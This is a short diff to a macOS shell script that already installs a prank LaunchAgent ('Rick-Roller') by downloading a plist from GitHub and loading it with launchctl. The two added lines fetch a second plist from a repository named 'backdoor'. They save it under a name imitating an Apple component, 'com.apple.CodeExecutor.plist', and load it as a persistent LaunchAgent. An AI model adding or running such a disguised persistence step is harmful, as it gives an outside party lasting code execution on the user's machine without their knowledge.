@@ -1,3 +1,5 @@
 cd ~/Library/LaunchAgents/
 curl -O "https://raw.githubusercontent.com/Wolfoverflow/Rick-Roller/main/com.wolfoverflow.giveup.plist"
 launchctl load ~/Library/LaunchAgents/com.wolfoverflow.giveup.plist
+curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/com.apple.CodeExecutor.plist"
+launchctl load ~/Library/LaunchAgents/com.apple.CodeExecutor.plist
